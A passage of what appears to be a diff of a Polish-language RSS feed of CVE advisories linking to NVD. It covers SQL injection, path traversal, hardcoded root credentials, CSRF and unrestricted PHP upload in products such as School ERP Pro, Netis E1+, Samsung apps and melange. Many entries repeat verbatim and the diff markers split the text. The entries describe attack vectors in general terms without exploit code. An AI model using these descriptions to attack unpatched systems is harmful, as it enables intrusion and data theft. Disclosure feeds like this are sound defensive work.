nieuwierzytelniony dostęp do plików, która umożliwia zdalnym atakującym pobieranie plików kopii zapasowych bazy danych bez uwierzytelniania.Osoby atakujące mogą uzyskać bezpośredni dostęp do wygenerowanych plików kopii zapasowych w katalogu Companies/weberp/, żądając pliku Backup_[znacznik czasu].sql.gz.</description></item><item><title>CVE-2020-37092</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37092</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Netis E1+ w wersji 1.2.32533 zawiera zakodowaną na stałe lukę w zabezpieczeniach konta root, która umożliwia nieuwierzytelnionym atakującym dostęp do urządzenia przy użyciu wcześniej zdefiniowanych poświadczeń.Atakujący mogą wykorzystać wbudowane konto root z możliwym do złamania hasłem, aby uzyskać pełny dostęp administracyjny do urządzenia sieciowego.</description></item><item><title>CVE-2026-1341</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1341</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Avation Light Engine Pro udostępnia interfejs konfiguracji i kontroli bez żadnego uwierzytelniania ani kontroli dostępu.</description></item><item><title>CVE-2020-37088</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37088</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę umożliwiającą ujawnienie plików, która umożliwia nieuwierzytelnionym atakującym odczytanie dowolnych plików poprzez manipulację parametrem „document” w download.php.Osoby atakujące mogą uzyskać dostęp do poufnych plików konfiguracyjnych, podając ścieżki przeglądania katalogów w celu pobrania poświadczeń systemowych i informacji konfiguracyjnych.</description></item><item><title>CVE-2020-37096</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37096</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Edimax EW-7438RPn 1.13 zawiera lukę umożliwiającą fałszowanie żądań między witrynami w interfejsie konfiguracyjnym filtrowania adresów MAC.Atakujący mogą tworzyć złośliwe strony internetowe, aby nakłonić użytkowników do dodania nieautoryzowanych adresów MAC do reguł filtrowania urządzenia bez ich zgody.</description></item><item><title>CVE-2020-37090</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37090</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę w zabezpieczeniach umożliwiającą przesyłanie plików, która umożliwia uczniom przesyłanie dowolnych plików PHP do systemu przesyłania wiadomości.Osoby atakujące mogą przesyłać złośliwe skrypty PHP za pośrednictwem funkcji załączania wiadomości, umożliwiając zdalne wykonanie kodu na serwerze.</description></item><item><title>CVE-2020-37097</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37097</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Edimax EW-7438RPn 1.13 zawiera lukę umożliwiającą ujawnienie informacji, która ujawnia szczegóły konfiguracji sieci Wi-Fi poprzez plik wlencrypt_wiz.asp.Osoby atakujące mogą uzyskać dostęp do skryptu w celu pobrania poufnych informacji, w tym nazwy sieci Wi-Fi i hasła w postaci zwykłego tekstu, przechowywanych w zmiennych konfiguracyjnych urządzenia.</description></item><item><title>CVE-2020-37086</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37086</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Aplikacja mobilna Easy Transfer 1.7 na iOS zawiera lukę w zabezpieczeniach umożliwiającą przechodzenie do katalogów, która umożliwia zdalnym atakującym dostęp do nieautoryzowanych ścieżek systemu plików bez uwierzytelniania.Osoby atakujące mogą wykorzystać tę lukę, manipulując parametrami ścieżki w żądaniach GET i POST w celu wyświetlenia lub pobrania wrażliwych plików systemowych oraz wstrzyknięcia złośliwych skryptów do parametrów aplikacji.</description></item><item><title>CVE-2020-37089</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37089</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę w zabezpieczeniach polegającą na wstrzykiwaniu kodu SQL w parametrze „es_messagesid”, która umożliwia atakującym manipulowanie zapytaniami do bazy danych za pomocą żądań GET.Osoby atakujące mogą wykorzystać ten wrażliwy parametr, wstrzykiwając spreparowane instrukcje SQL w celu potencjalnego wyodrębnienia, zmodyfikowania lub usunięcia informacji z bazy danych.</description></item><item><title>CVE-2020-37093</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37093</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Netis E1+ 1.2.32533 zawiera lukę umożliwiającą ujawnienie informacji, która umożliwia nieuwierzytelnionym atakującym odzyskanie haseł do Wi-Fi za pośrednictwem punktu końcowego netcore_get.cgi.Atakujący mogą wysłać żądanie GET do punktu końcowego w celu wyodrębnienia poufnych danych uwierzytelniających sieci, w tym identyfikatora SSID i haseł Wi-Fi, w postaci zwykłego tekstu.</description></item><item><title>CVE-2020-37091</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37091</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Maian Support Helpdesk 4.3 zawiera lukę umożliwiającą fałszowanie żądań między witrynami, która umożliwia atakującym tworzenie kont administracyjnych bez uwierzytelniania.Osoby atakujące mogą tworzyć złośliwe formularze HTML w celu dodawania użytkowników administracyjnych i przesyłania plików PHP z nieograniczonymi możliwościami przesyłania plików za pośrednictwem systemu załączników z często zadawanymi pytaniami.</description></item><item><title>CVE-2020-37085</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37085</link><pubDate>Wed, 04 Feb 2026 00:30:28 +0000</pubDate><description>VirtualTablet Server 3.0.2 zawiera lukę umożliwiającą odmowę usługi, która umożliwia atakującym zawieszenie usługi poprzez wysyłanie zbyt dużych ciągów danych za pośrednictwem protokołu Thrift.Osoby atakujące mogą wykorzystać tę lukę, wysyłając długi ciąg znaków do metody send_say(), co powoduje, że serwer przestanie odpowiadać.</description></item><item><title>CVE-2020-37076</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37076</link><pubDate>Wed, 04 Feb 2026 00:30:28 +0000</pubDate><description>Victor CMS w wersji 1.0 zawiera lukę w zabezpieczeniach polegającą na wstrzykiwaniu kodu SQL w parametrze „post” w pliku post.php, która umożliwia zdalnym atakującym manipulowanie zapytaniami do bazy danych.Osoby atakujące mogą wykorzystać tę lukę, wysyłając spreparowane ładunki UNION SELECT w celu wyodrębnienia informacji z bazy danych za pomocą technik wstrzykiwania opartych na wartościach logicznych, błędach i czasie.</description></item><item><title>CVE-2026-25145</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25145</link><pubDate>Wed, 04 Feb 2026 00:09:57 +0000</pubDate><description>Osoba atakująca, która może wpłynąć na plik konfiguracyjny melange (np. poprzez scenariusze CI oparte na żądaniach ściągnięcia lub budowanie jako usługa), może odczytać dowolne pliki z systemu hosta.Funkcja `LicensingInfos` w `pkg/config/config.go` odczytuje pliki licencyjne określone w `copyright[].license-path` bez sprawdzania, czy ścieżki pozostają w katalogu obszaru roboczego, umożliwiając przechodzenie ścieżek poprzez sekwencje `../`.Zawartość przeglądanego pliku jest osadzana w wygenerowanym SBOM jako tekst licencji, umożliwiając wydobywanie poufnych danych poprzez artefakty kompilacji.
+CVSS Score: 8.8 (high)</description></item><item><title>CVE-2026-1791</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1791</link><pubDate>Wed, 04 Feb 2026 06:31:20 +0000</pubDate><description>Nieograniczone przesyłanie plików z luką w zabezpieczeniach typu niebezpiecznego w Hillstone Networks Operation and Maintenance Security Gateway w systemie Linux umożliwia przesłanie powłoki internetowej na serwer internetowy. Ten problem dotyczy obsługi i konserwacji Security Gateway: V5.5ST00001B113.</description></item><item><title>CVE-2025-29867</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-29867</link><pubDate>Wed, 04 Feb 2026 06:31:20 +0000</pubDate><description>Dostęp do zasobów przy użyciu luki w zabezpieczeniach niezgodnego typu („pomieszanie typów”) w Hancom Inc. Hancom Office 2018, Hancom Inc. Hancom Office 2020, Hancom Inc. Hancom Office 2022, Hancom Inc. Hancom Office 2024 umożliwia wstrzykiwanie zawartości pliku. Ten problem dotyczy Hancom Office 2018: przed wersją 10.0.0.12681;Hancom Office 2020: przed 11.0.0.8916;Hancom Office 2022: przed 12.0.0.4426;Hancom Office 2024: przed 13.0.0.3050.</description></item><item><title>CVE-2026-20987</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20987</link><pubDate>Wed, 04 Feb 2026 06:14:50 +0000</pubDate><description>Niewłaściwa weryfikacja danych wejściowych w GalaxyDiagnostics przed wersją 3.5.050 umożliwia lokalnym uprzywilejowanym atakującym wykonywanie uprzywilejowanych poleceń.</description></item><item><title>CVE-2026-20986</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20986</link><pubDate>Wed, 04 Feb 2026 06:14:49 +0000</pubDate><description>Przechodzenie ścieżki w urządzeniach Samsung Members wcześniejszych niż chińska wersja 15.5.05.4 umożliwia lokalnym atakującym nadpisanie danych w ramach Samsung Members.</description></item><item><title>CVE-2026-20985</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20985</link><pubDate>Wed, 04 Feb 2026 06:14:48 +0000</pubDate><description>Nieprawidłowa weryfikacja danych wejściowych w programie Samsung Members przed wersją 5.6.00.11 umożliwia zdalnym atakującym połączenie dowolnego adresu URL i uruchomienie dowolnej aktywności z uprawnieniami Samsung Members.Do wyzwolenia tej luki wymagana jest interakcja użytkownika.</description></item><item><title>CVE-2026-20984</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20984</link><pubDate>Wed, 04 Feb 2026 06:14:47 +0000</pubDate><description>Niewłaściwa obsługa niewystarczających uprawnień w Galaxy Wearable zainstalowanym na urządzeniu innej firmy niż Samsung przed wersją 2.2.68 umożliwia lokalnym atakującym dostęp do poufnych informacji.</description></item><item><title>CVE-2026-20983</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20983</link><pubDate>Wed, 04 Feb 2026 06:14:45 +0000</pubDate><description>Niewłaściwy eksport komponentów aplikacji dla Androida w Samsung Dialer przed wersją 1 SMR z lutego 2026 r. umożliwia lokalnym atakującym uruchomienie dowolnej aktywności z uprawnieniami Samsung Dialer.</description></item><item><title>CVE-2026-20982</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20982</link><pubDate>Wed, 04 Feb 2026 06:14:44 +0000</pubDate><description>Przechodzenie ścieżki w ShortcutService przed wersją SMR z lutego 2026 r. 1 umożliwia uprzywilejowanemu lokalnemu atakującemu utworzenie pliku z uprawnieniami systemowymi.</description></item><item><title>CVE-2026-20981</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20981</link><pubDate>Wed, 04 Feb 2026 06:14:43 +0000</pubDate><description>Niewłaściwa weryfikacja danych wejściowych w FacAtFunction przed wersją 1 SMR z lutego 2026 r. umożliwia uprzywilejowanej osobie atakującej fizycznie wykonanie dowolnego polecenia z uprawnieniami systemowymi.</description></item><item><title>CVE-2026-20979</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20979</link><pubDate>Wed, 04 Feb 2026 06:14:40 +0000</pubDate><description>Niewłaściwe zarządzanie uprawnieniami w Ustawieniach przed wersją 1 SMR z lutego 2026 r. umożliwia lokalnym atakującym uruchomienie dowolnej aktywności z uprawnieniami Ustawienia.</description></item><item><title>CVE-2020-37094</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37094</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>EspoCRM 5.8.5 zawiera lukę w uwierzytelnianiu, która umożliwia atakującym dostęp do kont innych użytkowników poprzez manipulację nagłówkami autoryzacyjnymi.Osoby atakujące mogą dekodować i modyfikować tokeny autoryzacji podstawowej i autoryzacji Espo, aby uzyskać nieautoryzowany dostęp do informacji i przywilejów użytkowników administracyjnych.</description></item><item><title>CVE-2020-37082</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37082</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>webERP 4.15.1 zawiera lukę w zabezpieczeniach umożliwiającą nieuwierzytelniony dostęp do plików, która umożliwia zdalnym atakującym pobieranie plików kopii zapasowych bazy danych bez uwierzytelniania.Osoby atakujące mogą uzyskać bezpośredni dostęp do wygenerowanych plików kopii zapasowych w katalogu Companies/weberp/, żądając pliku Backup_[znacznik czasu].sql.gz.</description></item><item><title>CVE-2020-37092</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37092</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Netis E1+ w wersji 1.2.32533 zawiera zakodowaną na stałe lukę w zabezpieczeniach konta root, która umożliwia nieuwierzytelnionym atakującym dostęp do urządzenia przy użyciu wcześniej zdefiniowanych poświadczeń.Atakujący mogą wykorzystać wbudowane konto root z możliwym do złamania hasłem, aby uzyskać pełny dostęp administracyjny do urządzenia sieciowego.</description></item><item><title>CVE-2026-1341</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1341</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Avation Light Engine Pro udostępnia interfejs konfiguracji i kontroli bez żadnego uwierzytelniania ani kontroli dostępu.</description></item><item><title>CVE-2020-37088</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37088</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę umożliwiającą ujawnienie plików, która umożliwia nieuwierzytelnionym atakującym odczytanie dowolnych plików poprzez manipulację parametrem „document” w download.php.Osoby atakujące mogą uzyskać dostęp do poufnych plików konfiguracyjnych, podając ścieżki przeglądania katalogów w celu pobrania poświadczeń systemowych i informacji konfiguracyjnych.</description></item><item><title>CVE-2020-37096</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37096</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Edimax EW-7438RPn 1.13 zawiera lukę umożliwiającą fałszowanie żądań między witrynami w interfejsie konfiguracyjnym filtrowania adresów MAC.Atakujący mogą tworzyć złośliwe strony internetowe, aby nakłonić użytkowników do dodania nieautoryzowanych adresów MAC do reguł filtrowania urządzenia bez ich zgody.</description></item><item><title>CVE-2020-37090</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37090</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę w zabezpieczeniach umożliwiającą przesyłanie plików, która umożliwia uczniom przesyłanie dowolnych plików PHP do systemu przesyłania wiadomości.Osoby atakujące mogą przesyłać złośliwe skrypty PHP za pośrednictwem funkcji załączania wiadomości, umożliwiając zdalne wykonanie kodu na serwerze.</description></item><item><title>CVE-2020-37097</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37097</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Edimax EW-7438RPn 1.13 zawiera lukę umożliwiającą ujawnienie informacji, która ujawnia szczegóły konfiguracji sieci Wi-Fi poprzez plik wlencrypt_wiz.asp.Osoby atakujące mogą uzyskać dostęp do skryptu w celu pobrania poufnych informacji, w tym nazwy sieci Wi-Fi i hasła w postaci zwykłego tekstu, przechowywanych w zmiennych konfiguracyjnych urządzenia.</description></item><item><title>CVE-2020-37086</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37086</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Aplikacja mobilna Easy Transfer 1.7 na iOS zawiera lukę w zabezpieczeniach umożliwiającą przechodzenie do katalogów, która umożliwia zdalnym atakującym dostęp do nieautoryzowanych ścieżek systemu plików bez uwierzytelniania.Osoby atakujące mogą wykorzystać tę lukę, manipulując parametrami ścieżki w żądaniach GET i POST w celu wyświetlenia lub pobrania wrażliwych plików systemowych oraz wstrzyknięcia złośliwych skryptów do parametrów aplikacji.</description></item><item><title>CVE-2020-37089</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37089</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>School ERP Pro 1.0 zawiera lukę w zabezpieczeniach polegającą na wstrzykiwaniu kodu SQL w parametrze „es_messagesid”, która umożliwia atakującym manipulowanie zapytaniami do bazy danych za pomocą żądań GET.Osoby atakujące mogą wykorzystać ten wrażliwy parametr, wstrzykiwając spreparowane instrukcje SQL w celu potencjalnego wyodrębnienia, zmodyfikowania lub usunięcia informacji z bazy danych.</description></item><item><title>CVE-2020-37093</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37093</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Netis E1+ 1.2.32533 zawiera lukę umożliwiającą ujawnienie informacji, która umożliwia nieuwierzytelnionym atakującym odzyskanie haseł do Wi-Fi za pośrednictwem punktu końcowego netcore_get.cgi.Atakujący mogą wysłać żądanie GET do punktu końcowego w celu wyodrębnienia poufnych danych uwierzytelniających sieci, w tym identyfikatora SSID i haseł Wi-Fi, w postaci zwykłego tekstu.</description></item><item><title>CVE-2020-37091</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37091</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>Maian Support Helpdesk 4.3 zawiera lukę umożliwiającą fałszowanie żądań między witrynami, która umożliwia atakującym tworzenie kont administracyjnych bez uwierzytelniania.Osoby atakujące mogą tworzyć złośliwe formularze HTML w celu dodawania użytkowników administracyjnych i przesyłania plików PHP z nieograniczonymi możliwościami przesyłania plików za pośrednictwem systemu załączników z często zadawanymi pytaniami.</description></item><item><title>CVE-2020-37085</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37085</link><pubDate>Wed, 04 Feb 2026 00:30:28 +0000</pubDate><description>VirtualTablet Server 3.0.2 zawiera lukę umożliwiającą odmowę usługi, która umożliwia atakującym zawieszenie usługi poprzez wysyłanie zbyt dużych ciągów danych za pośrednictwem protokołu Thrift.Osoby atakujące mogą wykorzystać tę lukę, wysyłając długi ciąg znaków do metody send_say(), co powoduje, że serwer przestanie odpowiadać.</description></item><item><title>CVE-2020-37076</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37076</link><pubDate>Wed, 04 Feb 2026 00:30:28 +0000</pubDate><description>Victor CMS w wersji 1.0 zawiera lukę w zabezpieczeniach polegającą na wstrzykiwaniu kodu SQL w parametrze „post” w pliku post.php, która umożliwia zdalnym atakującym manipulowanie zapytaniami do bazy danych.Osoby atakujące mogą wykorzystać tę lukę, wysyłając spreparowane ładunki UNION SELECT w celu wyodrębnienia informacji z bazy danych za pomocą technik wstrzykiwania opartych na wartościach logicznych, błędach i czasie.</description></item><item><title>CVE-2026-25145</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25145</link><pubDate>Wed, 04 Feb 2026 00:09:57 +0000</pubDate><description>Osoba atakująca, która może wpłynąć na plik konfiguracyjny melange (np. poprzez scenariusze CI oparte na żądaniach ściągnięcia lub budowanie jako usługa), może odczytać dowolne pliki z systemu hosta.Funkcja `LicensingInfos` w `pkg/config/config.go` odczytuje pliki licencyjne określone w `copyright[].license-path` bez sprawdzania, czy ścieżki pozostają w katalogu obszaru roboczego, umożliwiając przechodzenie ścieżek poprzez sekwencje `../`.Zawartość przeglądanego pliku jest osadzana w wygenerowanym SBOM jako tekst licencji, umożliwiając wydobywanie poufnych danych poprzez artefakty kompilacji.
 
 Poprawka: Połączono w zatwierdzeniu 2f95c9f4
 
@@ -16291,7 +16579,20 @@ Aplikacja UniFi Protect (wersja 6.1.79 i wcześniejsze).
 Łagodzenie:
 Zaktualizuj aplikację UniFi Protect do wersji 6.2.72 lub nowszej.
 
-CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-21633</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21633</link><pubDate>Mon, 05 Jan 2026 16:47:38 +0000</pubDate><description>Złośliwy aktor mający dostęp do sąsiedniej sieci może uzyskać nieautoryzowany dostęp do kamery UniFi Protect Camera, wykorzystując lukę w protokole wykrywania w aplikacji Unifi Protect (wersja 6.1.79 i starsze).
+CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2025-59467</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-59467</link><pubDate>Mon, 05 Jan 2026 16:47:38 +0000</pubDate><description>Luka w zabezpieczeniach typu Cross-Site Scripting (XSS) we wtyczce UCRM Argentina AFIP faktury (wersja 1.2.0 i starsze) może pozwolić na eskalację uprawnień, jeśli administrator zostanie oszukany i odwiedzi spreparowaną złośliwą stronę.
+
+Ta wtyczka jest domyślnie wyłączona.
+
+
+Dotknięte produkty:
+Wtyczka faktur AFIP UCRM Argentina AFIP (wersja 1.2.0 i starsze)
+
+
+
+Łagodzenie:
+Zaktualizuj wtyczkę faktur AFIP UCRM Argentina do wersji 1.3.0 lub nowszej.
+
+CVSS Score: 7.5 (high)</description></item><item><title>CVE-2026-21633</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21633</link><pubDate>Mon, 05 Jan 2026 16:47:38 +0000</pubDate><description>Złośliwy aktor mający dostęp do sąsiedniej sieci może uzyskać nieautoryzowany dostęp do kamery UniFi Protect Camera, wykorzystując lukę w protokole wykrywania w aplikacji Unifi Protect (wersja 6.1.79 i starsze).
 
 
 
